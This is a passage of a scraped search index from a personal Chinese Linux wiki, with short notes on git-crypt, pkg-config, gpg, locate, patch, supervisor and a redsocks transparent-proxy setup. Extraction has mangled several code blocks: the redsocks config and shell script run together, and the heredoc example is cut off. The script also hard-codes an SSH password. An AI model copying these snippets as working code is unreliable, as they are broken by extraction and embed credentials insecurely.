KiB)","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"devtools","slug":"计算机/linux/devtools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/devtools/"}]},{"title":"git-crypt","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/devtools/git-crypt/","text":"建立一个加密的git仓库利用git-crypt可以做到给git仓库加密，这里用的win下的msys2兼容环境。 参考：https://www.jianshu.com/p/a40fc90df943 编译源码https://github.com/AGWA/git-crypt 123456789# 安装依赖pacman -S openssl-devel# 编译安装git clone --branch 0.6.0 https://github.com/AGWA/git-crypt.gitcd git-cryptmakemake install 生成GPG密钥12gpg --gen-keygpg --list-keys 加密仓库12git-crypt initgit-crypt add-gpg-user kelvv 配置需要加密的文件夹.gitattributes文件 1data/* filter=git-crypt diff=git-crypt 清除git缓存1git rm -r --cached config/ 导出密钥1git-crypt export-key /path/to/git-crypt-key 拿到仓库后解密1git-crypt unlock /path/to/git-crypt-key 或者先导入密钥到GPG，就不用输路径了","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"devtools","slug":"计算机/linux/devtools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/devtools/"}]},{"title":"memtool","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/devtools/memtool/","text":"memtool最简单的寄存器修改程序，buildroot里有包。 https://public.pengutronix.de/software/memtool/","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"devtools","slug":"计算机/linux/devtools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/devtools/"}]},{"title":"pkg-config","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/devtools/pkg-config/","text":"TODO 处理掉这些链接 交叉编译https://blog.csdn.net/mantis_1984/article/details/52847435https://blog.csdn.net/kl222/article/details/49705143?utm_source=blogxgwz6 用处 via: https://zh.wikipedia.org/wiki/Pkg-config pkg-config 是一个在源代码编译时查询已安装的库的使用接口的计算机工具软件。pkg-config原本是设计用于Linux的，但现在在各个版本的BSD、windows、Mac OS X和Solaris上都有着可用的版本。 它输出已安装的库的相关信息，包括： C/C++编译器需要的输入参数 链接器需要的输入参数 已安装软件包的版本信息 .pc文件每个.pc文件描述一个软件包，例如： 1234567891011prefix=/home/r/lede_lean/staging_dir/hostexec_prefix=/home/r/lede_lean/staging_dir/hostlibdir=${exec_prefix}/libincludedir=${prefix}/includeName: json-cDescription: JSON implementation in CVersion: 0.12.1Requires: Libs: -L${libdir} -ljson-cCflags: -I${includedir}/json-c 以live555为例，pkg-config方式安装动态库的例子： Makefile 1234install_shared_libraries:install -d $(DESTDIR)$(LIBDIR)/pkgconfigsed \"s#@PREFIX@#$(PREFIX)#;s#@LIBDIR@#$(LIBDIR)#;s#@VERSION@#$(VERSION)#\" live555.pc.in > $(DESTDIR)$(LIBDIR)/pkgconfig/live555.pcchmod 644 $(DESTDIR)$(LIBDIR)/pkgconfig/live555.pc live555.pc.in 123456789prefix=@PREFIX@libdir=@LIBDIR@includedir=${prefix}/includeName: live555Description: multimedia RTSP streaming libraryVersion: @VERSION@Cflags: -I${includedir}/liveMedia -I${includedir}/groupsock -I${includedir}/BasicUsageEnvironment -I${includedir}/UsageEnvironmentLibs: -L${libdir} -lliveMedia -lgroupsock -lBasicUsageEnvironment -lUsageEnvironment 使用方法最常用： 1234$ pkg-config --cflags json-c-I/usr/include/json-c$ pkg-config --libs json-c-ljson-c Makefile中取参数例子，引用库libusb-1.0： 123# use pkg-configCFLAGS += $(shell pkg-config libusb-1.0 --cflags)LDFLAGS += $(shell pkg-config libusb-1.0 --libs) 遇到的问题明明存在.pc文件，但pkg-config搜索不到PC上大多数软件的.pc都会装在/usr/lib/x86_64-linux-gnu/pkgconfig/里，但Mint Linux就没在PKG_CONFIG_PATH里默认放好路径，应该是个bug，手动加在/etc/profile里即可，比如： 1export PKG_CONFIG_PATH=/usr/lib/x86_64-linux-gnu/pkgconfig/:PKG_CONFIG_PATH","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"devtools","slug":"计算机/linux/devtools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/devtools/"}]},{"title":"内存泄漏检测","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/devtools/内存泄漏检测/","text":"mtracehttp://man7.org/linux/man-pages/man3/mtrace.3.html 1#include 程序中包含头文件, 使用mtrace命令行工具即可分析内存泄漏问题. 其实是对malloc/free的hook.","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"devtools","slug":"计算机/linux/devtools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/devtools/"}]},{"title":"动态链接","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/devtools/动态链接/","text":"配置动态链接库目录的地方/etc/ld.so.conf，提示找不到库的时候修改。 1234# 刷新动态库高速缓存，安装新库之后找不到.so文件时执行sudo ldconfig# 打印缓存中的内容ldconfig -p","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"devtools","slug":"计算机/linux/devtools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/devtools/"}]},{"title":"crontab","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/tools/crontab/","text":"crontab定时任务编辑配置：1crontab -e 内容：12# 每天02:06重启06 2 * * * reboot","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"enca","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/tools/enca/","text":"文本编码转换https://blog.csdn.net/u012724167/article/details/77248919 12# 转换目录下所有文件到UTF8enca -L zh_CN -x UTF-8 * 但是不成功啊：123r@r-work /mnt/hgfs/project/osukb/osu-keyboard-v3/app $ enca -V -L zh_CN -x utf-8 keymap.cenca: converting `keymap.c': UCS-2/CRLF/21..UTF-8enca: librecode warning: Conversion leads to ambiguous output in `keymap.c'","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"filesystem","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/tools/filesystem/","text":"/dev/shm一个ramdisk，可以往内存里放需要高速缓存的问题。 linux访问NTFS盘报错：no object for d-bus interface1234mount | grep gvfssudo umount -fl /run/user/（用户ID数字） gvfssudo rm -rf /run/user/（用户ID数字） gvfsreboot","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"heredoc","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/tools/heredoc/","text":"方便在sh脚本里将数据写入文件 123456789#!/bin/bashOUT=/tmp/output.txtecho \"Starting my script...\"echo \"Doing something...\"cat","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"gpg","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/tools/gpg/","text":"123456789# 生成密钥gpg --gen-key# 罗列密钥gpg --list-keys# 导出gpg --armor --output public-key.txt --exportgpg --armor --output private-key.txt --export-secret-keys GPG入门教程 作者： 阮一峰 via：http://www.ruanyifeng.com/blog/2013/07/gpg.html 前两篇文章，我介绍了RSA算法。 今天，就接着来看，现实中怎么使用这个算法，对信息加密和解密。这要用到GnuPG软件（简称GPG），它是目前最流行、最好用的加密工具之一。 一、什么是GPG 要了解什么是GPG，就要先了解PGP。 1991年，程序员Phil Zimmermann为了避开政府监视，开发了加密软件PGP。这个软件非常好用，迅速流传开来，成了许多程序员的必备工具。但是，它是商业软件，不能自由使用。所以，自由软件基金会决定，开发一个PGP的替代品，取名为GnuPG。这就是GPG的由来。 GPG有许多用途，本文主要介绍文件加密。至于邮件的加密，不同的邮件客户端有不同的设置，请参考Ubuntu网站的介绍。 本文的使用环境为Linux命令行。如果掌握了命令行，Windows 或 Mac OS 客户端，就非常容易掌握。GPG并不难学，学会了它，从此就能轻松传递加密信息。建议读者一步步跟着教程做，对每条命令都自行测试。 二、安装 GPG有两种安装方式。可以下载源码，自己编译安装。 ./configure make make install 也可以安装编译好的二进制包。 # Debian / Ubuntu 环境 sudo apt-get install gnupg # Fedora 环境 yum install gnupg 安装完成后，键入下面的命令： gpg –help 如果屏幕显示GPG的帮助，就表示安装成功。 三、生成密钥 安装成功后，使用gen-ken参数生成自己的密钥。 gpg –gen-key 回车以后，会跳出一大段文字： gpg (GnuPG) 1.4.12; Copyright (C) 2012 Free Software Foundation, Inc. This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. 请选择您要使用的密钥种类： (1) RSA and RSA (default) (2) DSA and Elgamal (3) DSA (仅用于签名) (4) RSA (仅用于签名) 您的选择？ 第一段是版权声明，然后让用户自己选择加密算法。默认选择第一个选项，表示加密和签名都使用RSA算法。 然后，系统就会问你密钥的长度。 RSA 密钥长度应在 1024 位与 4096 位之间。 您想要用多大的密钥尺寸？(2048) 密钥越长越安全，默认是2048位。 接着，设定密钥的有效期。 请设定这把密钥的有效期限。 0 = 密钥永不过期 = 密钥在 n 天后过期 w = 密钥在 n 周后过期 m = 密钥在 n 月后过期 y = 密钥在 n 年后过期 密钥的有效期限是？(0) 如果密钥只是个人使用，并且你很确定可以有效保管私钥，建议选择第一个选项，即永不过期。回答完上面三个问题以后，系统让你确认。 以上正确吗？(y/n) 输入y，系统就要求你提供个人信息。 您需要一个用户标识来辨识您的密钥；本软件会用真实姓名、注释和电子邮件地址组合成用户标识，如下所示： “Heinrich Heine (Der Dichter) heinrichh@duesseldorf.de“ 真实姓名： 电子邮件地址： 注释： “真实姓名”填入你姓名的英文写法，”电子邮件地址”填入你的邮件地址，”注释”这一栏可以空着。 然后，你的”用户ID”生成了。 您选定了这个用户标识： “Ruan YiFeng yifeng.ruan@gmail.com“ 我的”真实姓名”是Ruan YiFeng，”电子邮件地址”是yifeng.ruan@gmail.com，所以我的”用户ID”就是”Ruan YiFeng yifeng.ruan@gmail.com“。系统会让你最后确认一次。 更改姓名(N)、注释(C)、电子邮件地址(E)或确定(O)/退出(Q)？ 输入O表示”确定”。 接着，系统会让你设定一个私钥的密码。这是为了防止误操作，或者系统被侵入时有人擅自动用私钥。 您需要一个密码来保护您的私钥： 然后，系统就开始生成密钥了，这时会要求你做一些随机的举动，以生成一个随机数。 我们需要生成大量的随机字节。这个时候您可以多做些琐事(像是敲打键盘、移动鼠标、读写硬盘之类的)，这会让随机数字发生器有更好的机会获得足够的熵数。 几分钟以后，系统提示密钥已经生成了。 gpg: 密钥 EDDD6D76 被标记为绝对信任 公钥和私钥已经生成并经签名。 请注意上面的字符串”EDDD6D76”，这是”用户ID”的Hash字符串，可以用来替代”用户ID”。 这时，最好再生成一张”撤销证书”，以备以后密钥作废时，可以请求外部的公钥服务器撤销你的公钥。 gpg –gen-revoke [用户ID] 上面的”用户ID”部分，可以填入你的邮件地址或者Hash字符串（以下同）。 四、密钥管理 4.1 列出密钥 list-keys参数列出系统中已有的密钥． gpg –list-keys 显示结果如下： /home/ruanyf/.gnupg/pubring.gpg pub 4096R/EDDD6D76 2013-07-11 uid Ruan YiFeng yifeng.ruan@gmail.com sub 4096R/3FA69BE4 2013-07-11 第一行显示公钥文件名（pubring.gpg），第二行显示公钥特征（4096位，Hash字符串和生成时间），第三行显示”用户ID”，第四行显示私钥特征。 如果你要从密钥列表中删除某个密钥，可以使用delete-key参数。 gpg –delete-key [用户ID] 4.2 输出密钥 公钥文件（.gnupg/pubring.gpg）以二进制形式储存，armor参数可以将其转换为ASCII码显示。 gpg –armor –output public-key.txt –export [用户ID] “用户ID”指定哪个用户的公钥，output参数指定输出文件名（public-key.txt）。 类似地，export-secret-keys参数可以转换私钥。 gpg –armor –output private-key.txt –export-secret-keys 4.3 上传公钥 公钥服务器是网络上专门储存用户公钥的服务器。send-keys参数可以将公钥上传到服务器。 gpg –send-keys [用户ID] –keyserver hkp://subkeys.pgp.net 使用上面的命令，你的公钥就被传到了服务器subkeys.pgp.net，然后通过交换机制，所有的公钥服务器最终都会包含你的公钥。 由于公钥服务器没有检查机制，任何人都可以用你的名义上传公钥，所以没有办法保证服务器上的公钥的可靠性。通常，你可以在网站上公布一个公钥指纹，让其他人核对下载到的公钥是否为真。fingerprint参数生成公钥指纹。 gpg –fingerprint [用户ID] 4.4 输入密钥 除了生成自己的密钥，还需要将他人的公钥或者你的其他密钥输入系统。这时可以使用import参数。 gpg –import [密钥文件] 为了获得他人的公钥，可以让对方直接发给你，或者到公钥服务器上寻找。 gpg –keyserver hkp://subkeys.pgp.net –search-keys [用户ID] 正如前面提到的，我们无法保证服务器上的公钥是否可靠，下载后还需要用其他机制验证． 五、加密和解密 5.1 加密 假定有一个文本文件demo.txt，怎样对它加密呢？ encrypt参数用于加密。 gpg –recipient [用户ID] –output demo.en.txt –encrypt demo.txt recipient参数指定接收者的公钥，output参数指定加密后的文件名，encrypt参数指定源文件。运行上面的命令后，demo.en.txt就是已加密的文件，可以把它发给对方。 5.2 解密 对方收到加密文件以后，就用自己的私钥解密。 gpg –decrypt demo.en.txt –output demo.de.txt decrypt参数指定需要解密的文件，output参数指定解密后生成的文件。运行上面的命令，demo.de.txt就是解密后的文件。 GPG允许省略decrypt参数。 gpg demo.en.txt 运行上面的命令以后，解密后的文件内容直接显示在标准输出。 六、签名 6.1 对文件签名 有时，我们不需要加密文件，只需要对文件签名，表示这个文件确实是我本人发出的。sign参数用来签名。 gpg –sign demo.txt 运行上面的命令后，当前目录下生成demo.txt.gpg文件，这就是签名后的文件。这个文件默认采用二进制储存，如果想生成ASCII码的签名文件，可以使用clearsign参数。 gpg –clearsign demo.txt 运行上面的命令后 ，当前目录下生成demo.txt.asc文件，后缀名asc表示该文件是ASCII码形式的。 如果想生成单独的签名文件，与文件内容分开存放，可以使用detach-sign参数。 gpg –detach-sign demo.txt 运行上面的命令后，当前目录下生成一个单独的签名文件demo.txt.sig。该文件是二进制形式的，如果想采用ASCII码形式，要加上armor参数。 gpg –armor –detach-sign demo.txt 6.2 签名+加密 上一节的参数，都是只签名不加密。如果想同时签名和加密，可以使用下面的命令。 gpg –local-user [发信者ID] –recipient [接收者ID] –armor –sign –encrypt demo.txt local-user参数指定用发信者的私钥签名，recipient参数指定用接收者的公钥加密，armor参数表示采用ASCII码形式显示，sign参数表示需要签名，encrypt参数表示指定源文件。 6.3 验证签名 我们收到别人签名后的文件，需要用对方的公钥验证签名是否为真。verify参数用来验证。 gpg –verify demo.txt.asc demo.txt 举例来说，openvpn网站就提供每一个下载包的gpg签名文件。你可以根据它的说明，验证这些下载包是否为真。 七、参考文档 Paul Heinlein, GPG Quick Start Ubuntu help，GnuPrivacyGuardHowto KNL, GnuPG Tutorial Alan Eliasen. GPG Tutorial GnuPG 袖珍 HOWTO (中文版) The GNU Privacy Handbook （完）","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"locate","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/tools/locate/","text":"locate(locate) 命令用来查找文件或目录。 locate命令要比find -name快得多，原因在于它不搜索具体目录，而是搜索一个数据库/var/lib/mlocate/mlocate.db 。这个数据库中含有本地所有文件信息。Linux系统自动创建这个数据库，并且每天自动更新一次， 转载自：https://www.cnblogs.com/xqzt/p/5426666.html 1、命令简介​ locate(locate) 命令用来查找文件或目录。 locate命令要比find -name快得多，原因在于它不搜索具体目录，而是搜索一个数据库/var/lib/mlocate/mlocate.db 。这个数据库中含有本地所有文件信息。Linux系统自动创建这个数据库，并且每天自动更新一次，因此，我们在用whereis和locate 查找文件时，有时会找到已经被删除的数据，或者刚刚建立文件，却无法查找到，原因就是因为数据库文件没有被更新。为了避免这种情况，可以在使用locate之前，先使用updatedb命令，手动更新数据库。整个locate工作其实是由四部分组成的: /usr/bin/updatedb 主要用来更新数据库，通过crontab自动完成的 /usr/bin/locate 查询文件位置 /etc/updatedb.conf updatedb的配置文件 /var/lib/mlocate/mlocate.db 存放文件信息的文件 2、用法1locate [OPTION]... [PATTERN]... 3、选项123456789101112131415161718-b, --basename match only the base name of path names-c, --count 只输出找到的数量-d, --database DBPATH 使用DBPATH指定的数据库，而不是默认数据库 /var/lib/mlocate/mlocate.db-e, --existing only print entries for currently existing files-L, --follow follow trailing symbolic links when checking file existence (default)-h, --help 显示帮助-i, --ignore-case 忽略大小写-l, --limit, -n LIMIT limit output (or counting) to LIMIT entries-m, --mmap ignored, for backward compatibility-P, --nofollow, -H don't follow trailing symbolic links when checking file existence-0, --null separate entries with NUL on output-S, --statistics don't search for entries, print statistics about eachused database-q, --quiet 安静模式，不会显示任何错误讯息-r, --regexp REGEXP 使用基本正则表达式 --regex 使用扩展正则表达式-s, --stdio ignored, for backward compatibility-V, --version 显示版本信息-w, --wholename match whole path name (default) 4、示例示例1： 搜索etc目录下所有以my开头的文件12[root@cent6 lib]# locate /etc/my/etc/my.cnf 示例2：新增的文件无法locate，使用updatedb12345[root@cent6 ~]# touch new.txt[root@cent6 ~]# locate new.txt[root@cent6 ~]# updatedb[root@cent6 ~]# locate new.txt/root/new.txt 示例3：updatedb的配置文件/etc/updatedb.conf12345[root@cent6 ~]# cat /etc/updatedb.conf PRUNE_BIND_MOUNTS = \"yes\"PRUNEFS = \"9p afs anon_inodefs auto autofs bdev binfmt_misc cgroup cifs coda configfs cpuset debugfs devpts ecryptfs exofs fuse fusectl gfs gfs2 hugetlbfs inotifyfs iso9660 jffs2 lustre mqueue ncpfs nfs nfs4 nfsd pipefs proc ramfs rootfs rpc_pipefs securityfs selinuxfs sfs sockfs sysfs tmpfs ubifs udf usbfs\"PRUNENAMES = \".git .hg .svn\"PRUNEPATHS = \"/afs /media /net /sfs /tmp /udev /var/cache/ccache /var/spool/cups /var/spool/squid /var/tmp\" 第一行PRUNE_BIND_MOUNTS=”yes”的意思是：是否进行限制搜索。 第二行是排除检索的文件系统类型，即列出的文件系统类型不进行检索。 第二行表示对哪些后缀的文件排除检索，也就是列在这里面的后缀的文件跳过不进行检索。不同后缀之间用空格隔开。 第四行是排除检索的路径，即列出的路径下的文件和子文件夹均跳过不进行检索。updatedb之后使用locate仍然找不到想要文件 可以检查挂载的目录是否被忽略了","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"patch","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/tools/patch/","text":"生成patch && 打patcha为修改前，b为修改后。 单文件生成patch：1diff -up a/1.txt b/1.txt > patch 多文件生成patch：1diff -uprN a/ b/ > patch 打patch，需要切换到该目录中，用p1参数忽略第一级目录，因为目录名可能不同：1patch -p1 < patch1.diff","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"rsync","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/tools/rsync/","text":"rsync同步工具12# 本地文件夹同步rsync -av rsync同步工具12# 本地文件夹同步rsync -av 报错chgrp…..permission denied去掉-a就不会执行这操作了","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"redsocks","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/tools/redsocks/","text":"redsocks教程 转载自：http://www.h1z166.com/articles/2017/08/21/1503247650811.html 严格意义上来说，proxychains不算自动的全局代理，有没有像Proxifier这样，开了之后自动让所有启动的程序都走系统代理呢？答案就是redsocks。首先安装Ubuntu编译环境和必要的库：sudo apt-get install autoconf automake libtool libevent-dev g++下载源代码，然后编译安装：./mkauto.shcp redsocks /usr/local/bin/配置文件为：base {// debug: connection progress & client list on SIGUSR1log_debug = off;// info: start and end of client sessionlog_info = off;/* possible `log’ values are: stderr file:/path/to/file syslog:FACILITY facility is any of “daemon”, “local0”…”local7”/log = “file:/dev/null”;// log = stderr;// log = “file:/path/to/file”;// log = “syslog:local7”;// detach from consoledaemon = on;/ Change uid, gid and root directory, these options require root privilegies on startup. Note, your chroot may requre /etc/localtime if you write log to syslog. Log is opened before chroot & uid changing./// user = nobody;// group = nobody;// chroot = “/var/chroot”;/ possible `redirector’ values are: iptables - for Linux ipf - for FreeBSD pf - for OpenBSD generic - some generic redirector that MAY work/redirector = iptables;}redsocks {/ `local_ip’ defaults to 127.0.0.1 for security reasons, use 0.0.0.0 if you want to listen on every interface. local_*' are used as port to redirect to. */ local_ip = 127.0.0.1; local_port = 12345; //ip’ and port' are IP and tcp-port of proxy-server ip = 127.0.0.1; port = 7070; // known types: socks4, socks5, http-connect, http-relay type = socks5; // login = \"foobar\"; // password = \"baz\"; } redudp { //local_ip’ should not be 0.0.0.0 as it’s also used for outgoing// packets that are sent as replies - and it should be fixed// if we want NAT to work properly.local_ip = 127.0.0.1;local_port = 10053;// ip' andport’ of socks5 proxy server.ip = 10.0.0.1;port = 1080;login = username;password = pazzw0rd;// kernel does not give us this information, so we have to duplicate it// in both iptables rules and configuration file. By the way, you can// set local_ip' to 127.45.67.89 if you need more than 65535 ports to // forward ;-) // This limitation may be relaxed in future versions using contrack-tools. dest_ip = 8.8.8.8; dest_port = 53; udp_timeout = 30; udp_timeout_stream = 180; } dnstc { // fake and really dumb DNS server that returns \"truncated answer\" to // every query via UDP, RFC-compliant resolver should repeat same query // via TCP in this case. local_ip = 127.0.0.1; local_port = 5300; } // you can add moreredsocks’ and `redudp’ sections if you need.这里的配置没有配置udp的代理部分，只是配置了tcp即redsocks部分。监听端口是12345。日志关闭了，因为好像我下载的当前版本无论怎么样都产生一堆调试日志，不知道以后会不会修复这点。启动关闭脚本redsocks.sh为（via）：#! /bin/bashSSHHOST=crekeSSHPORT=22SSHUSR=crekeSSHPWD=crekeSSHDAEMON=/usr/local/bin/plinkSSHPIDFILE=/var/run/sshtunnel.pidstart_ssh(){ echo “Start SSH Tunnel Daemon: “ start-stop-daemon -b -q -m -p $SSHPIDFILE –exec $SSHDAEMON -S \\ – -N -D 127.0.0.1:7070 -P $SSHPORT -pw $SSHPWD $SSHUSR@$SSHHOST echo “SSH Tunnel Daemon Started.”}stop_ssh(){ #ps aux|grep “ssh -NfD 1234”|awk ‘{print $2}’|xargs kill if [ -f $SSHPIDFILE ]; then PID=$(cat $SSHPIDFILE) kill $PID while [ -d /proc/$PID ]; do sleep 1 done fi rm -rf $SSHPIDFILE echo “SSH Tunnel Daemon Stoped.”}case “$1” instart) start_ssh cd /usr/local/redsocks if [ -e redsocks.log ] ; then rm redsocks.log fi ./redsocks -p /usr/local/redsocks/redsocks.pid #set daemon = on in config file start redirectioniptables -t nat -A OUTPUT -p tcp –dport 80 -j REDIRECT –to 12345iptables -t nat -A OUTPUT -p tcp –dport 443 -j REDIRECT –to 12345Create new chain iptables -t nat -N REDSOCKSIgnore LANs and some other reserved addresses. iptables -t nat -A REDSOCKS -d 0.0.0.0/8 -j RETURN iptables -t nat -A REDSOCKS -d 10.0.0.0/8 -j RETURN iptables -t nat -A REDSOCKS -d 127.0.0.0/8 -j RETURN iptables -t nat -A REDSOCKS -d 169.254.0.0/16 -j RETURN iptables -t nat -A REDSOCKS -d 172.16.0.0/12 -j RETURN iptables -t nat -A REDSOCKS -d 192.168.0.0/16 -j RETURN iptables -t nat -A REDSOCKS -d 224.0.0.0/4 -j RETURN iptables -t nat -A REDSOCKS -d 240.0.0.0/4 -j RETURNAnything else should be redirected to port 12345 iptables -t nat -A REDSOCKS -p tcp -j REDIRECT –to-ports 12345 Any tcp connection should be redirected. iptables -t nat -A OUTPUT -p tcp -j REDSOCKS ;;stop) stop_ssh cd /usr/local/redsocks if [ -e redsocks.pid ]; then kill `cat redsocks.pid` rm redsocks.pid else echo already killed, anyway, I will try killall killall -9 redsocks fi stop redirection iptables -t nat -F OUTPUT iptables -t nat -F REDSOCKS iptables -t nat -X REDSOCKS ;;start_ssh) start_ssh ;;stop_ssh) stop_ssh ;;clean_dns) iptables -A INPUT -p udp –sport 53 -m state –state ESTABLISHED -m you-know-who -j DROP -m comment –comment “drop you-know-who dns hijacks” echo this function not finished ;;*) echo “Usage: redsocks start|stop|start_ssh|stop_ssh|clean_dns” >&2 exit 3 ;;esaciptables的规则是让所有的TCP包都发送到redsocks监听的端口12345。本脚本还整合了ssh的daemon启动，使用start-stop-daemon来实现。启动和关闭：将启动关闭脚本中的开头的几个变量配置好启动命令：sudo ./redsocks.sh start关闭命令：sudo ./redsocks.sh stop","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"samba","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/tools/samba/","text":"samba文件服务配置123/etc/samba/smb.conf #samba服务的主要配置文件/var/log/samba #samab服务存放日志文件","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"supervisor","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/tools/supervisor/","text":"守护进程管理工具Supervisor 轻松管理守护进程，就算挂了也可以被拉起来。 例子，/etc/supervisor/conf.d/ss.conf 123456789101112131415[program:ss-server]command=ss-server -c /etc/shadowsocks-libev/config.jsondirectory=/homeenvironment=环境变量A=\"\";环境变量B=\"\"stdout_logfile_maxbytes=20MBstdout_logfile=/var/log/supervisor/%(program_name)s.logstderr_logfile_maxbytes=20MBstderr_logfile=/var/log/supervisor/%(program_name)s.logautostart=trueautorestart=truestartsecs=5priority=1stopsignal=HUPstopasgroup=truekillasgroup=true 注意这里的command，不是命令行，要执行bash命令可以bash -c \"xxxx\"。 环境变量的问题，类似这样解决，详细可以参考man supervisor： 1environment=PYTHONPATH=/opt/mypypath:%(ENV_PYTHONPATH)s,PATH=/opt/mypath:%(ENV_PATH)s 交互式操作界面superviosrctl命令进入交互式界面，常用命令：reload、status","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"tee","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/tools/tee/","text":"tee 写入文件的同时输出到stdouthttps://linux.cn/article-9435-1.html 1ping google.com | tee output.txt 选项-a 追加 为初学者介绍的 Linux tee 命令（6 个例子） via: https://www.howtoforge.com/linux-tee-command/ 作者：Himanshu Arora 译者：CYLeft 校对：wxy 